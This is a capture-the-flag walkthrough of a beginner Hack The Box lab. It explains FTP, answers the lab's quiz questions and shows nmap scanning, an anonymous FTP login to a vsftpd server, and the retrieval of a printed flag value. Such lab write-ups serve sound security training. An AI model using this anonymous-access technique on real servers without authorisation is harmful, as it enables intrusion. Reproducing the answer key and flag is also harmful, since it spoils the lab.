#ftp #protocols #anonymous-access #reconnaissance 

# 0. Theory

According to definition on Wikipedia:
> The File Transfer Protocol (FTP) is a standard communication protocol used to transfer computer files from a server to a client on a computer network. FTP is built on a client– server model architecture using separate control and data connections between the client and the server. FTP users may authenticate themselves with a clear-text sign-in protocol, generally in the form of a username and password. However, they can connect anonymously if the server is configured to allow it. For secure transmission that protects the username and password and encrypts the content, FTP is often secured with SSL/TLS (FTPS) or replaced with SSH File Transfer Protocol (SFTP).

Conceptually speaking, the client is always the host that downloads and uploads files to the server, and the server always is the host that safely stores the data being transferred.

A port running an active service is a reserved space for the IP address of the target to receive requests and send results from. If we only had IP addresses or hostnames, then the hosts could only do 1 task at a time; hence the granularity of ports. By having ports, you can have one IP address handling multiple services, as it adds another layer of distinction.

The Wiki article shows that it is considered non-standard for FTP to be used without the encryption layer provided by protocols such as SSL/TLS (FTPS) or SSH-tunneling (SFTP). FTP by itself does have the ability to require credentials before allowing access to the stored files. However, the deficiency here is that traffic containing said files can be intercepted with what is known as a Man-in-the-Middle Attack (MitM). The contents of the files can be read in plaintext (meaning unencrypted, human-readable form).
![[Pasted image 20240826233951.png]]
However, if the network administrators choose to wrap the connection with the SSL/TLS protocol or tunnel the FTP connection through SSH (as shown below) to add a layer of encryption that only the source and destination hosts can decrypt, this would successfully foil most Man-in-the-Middle attacks. Notice how port 21 has disappeared, as the FTP protocol gets moved under the SSH protocol on port 22, thus being tunneled through it and secured against any interception.
![[Pasted image 20240826234044.png]]



**What does the 3-letter acronym FTP stand for?**
*File Transfer Protocol*

**Which port does the FTP service listen on usually?**
*21 (22 for SSH and 80 for WebServer)*

**FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?**
*SFTP*

**What is the command we can use to send an ICMP echo request to test our connection to the target?**
*ping*

**What is the command we need to run in order to display the 'ftp' client help menu?**
*ftp -h*

**What is username that is used over FTP when you want to log in without having an account?**
*anonymous*

**What is the response code we get for the FTP message 'Login successful'?**
*230*

**There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.**
*ls*

**What is the command used to download the file we found on the FTP server?**
*get*

# 1. Recon

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ ping 10.129.250.175 -c 5
	PING 10.129.250.175 (10.129.250.175) 56(84) bytes of data.
	64 bytes from 10.129.250.175: icmp_seq=1 ttl=63 time=8.21 ms
	64 bytes from 10.129.250.175: icmp_seq=2 ttl=63 time=8.39 ms
	64 bytes from 10.129.250.175: icmp_seq=3 ttl=63 time=8.16 ms
	64 bytes from 10.129.250.175: icmp_seq=4 ttl=63 time=8.07 ms
	64 bytes from 10.129.250.175: icmp_seq=5 ttl=63 time=8.07 ms
	
	--- 10.129.250.175 ping statistics ---
	5 packets transmitted, 5 received, 0% packet loss, time 4005ms
	rtt min/avg/max/mdev = 8.070/8.181/8.394/0.118 ms

# 2. Enumeration

Since we have a successful connection to target IP, we can start scanning the open services on the target host.

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ sudo nmap 10.129.250.175
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 16:44 CDT
	Nmap scan report for 10.129.250.175
	Host is up (0.0085s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT   STATE SERVICE
	21/tcp open  ftp
	
	Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds

We see that port **21** is open. Scanning with the `-sV` flag **(version detection)** gives us more info on the actual version of the service running on that port.

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ sudo nmap 10.129.250.175 -sV
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 16:45 CDT
	Nmap scan report for 10.129.250.175
	Host is up (0.010s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	Service Info: OS: Unix
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds


# 3. Foothold

In order to access the FTP service, we will use the `ftp` command on our own host. It's good practice to have a quick check that your `ftp` is up to date and installed properly.
The `-y` switch at the end of the command is used to accept the installation without interrupting the process to ask you if you'd like to proceed.

	─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ sudo apt install ftp -y
	Reading package lists... Done
	Building dependency tree... Done
	Reading state information... Done
	ftp is already the newest version (20210827-4).
	The following packages were automatically installed and are no longer required:
	  espeak-ng-data geany-common libamd2 libbabl-0.1-0 libbrlapi0.8 libcamd2 libccolamd2
	  libcholmod3 libdotconf0 libept1.6.0 libespeak-ng1 libgegl-0.4-0 libgegl-common libgimp2.0
	  libmetis5 libmng1 libmypaint-1.5-1 libmypaint-common libpcaudio0 libsonic0 libspeechd2
	  libtorrent-rasterbar2.0 libumfpack5 libwmf-0.2-7 libwpe-1.0-1 libwpebackend-fdo-1.0-1
	  libxapian30 node-clipboard node-prismjs python3-brlapi python3-louis python3-pyatspi
	  python3-speechd sound-icons speech-dispatcher-audio-plugins xbrlapi xkbset
	Use 'sudo apt autoremove' to remove them.
	0 upgraded, 0 newly installed, 0 to remove and 156 not upgraded.

Using the `ftp` command we can attempt to connect to the target host now.
The prompt will ask us for the username we want to log in with.

A typical misconfiguration for running FTP services allows an `anonymous` account to access the service like any other authenticated user. The `anonymous` username can be input when the prompt appears, followed by any password whatsoever since the service will disregard the password for this specific account.

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ ftp 10.129.250.175
	Connected to 10.129.250.175.
	220 (vsFTPd 3.0.3)
	Name (10.129.250.175:root): anonymous
	331 Please specify the password.
	Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> 

Now that we have connected to the target host's ftp service successfully, we get an ftp terminal. Typing either the `-h` , `--help` , or `help` commands will always issue a list of all the commands available to you as a user, with descriptions occasionally included. This is true for any other script and service that we have access to.

By listing the content of the directory, we can find the flag to be captured:

	ftp> ls
	229 Entering Extended Passive Mode (|||6800|)
	150 Here comes the directory listing.
	-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
	226 Directory send OK.

We can download it with the get command:

	ftp> get flag.txt
	local: flag.txt remote: flag.txt
	229 Entering Extended Passive Mode (|||59891|)
	150 Opening BINARY mode data connection for flag.txt (32 bytes).
	100% |*****************************************************|    32       63.64 KiB/s    00:00 ETA
	226 Transfer complete.
	32 bytes received in 00:00 (3.76 KiB/s)

If we exit the ftp service now, we can find the downloaded file in our directory.

	ftp> bye
	221 Goodbye.
	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ ls
	cacert.der  Documents  flag.txt  my_data   Public     Videos
	Desktop     Downloads  Music     Pictures  Templates
	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-0og5ykbdfw]─[~]
	└──╼ [★]$ cat flag.txt 
	035db21c881520061c53e0536e44f815


https://www.hackthebox.com/achievement/machine/2057492/393
![[Pasted image 20240827000621.png]]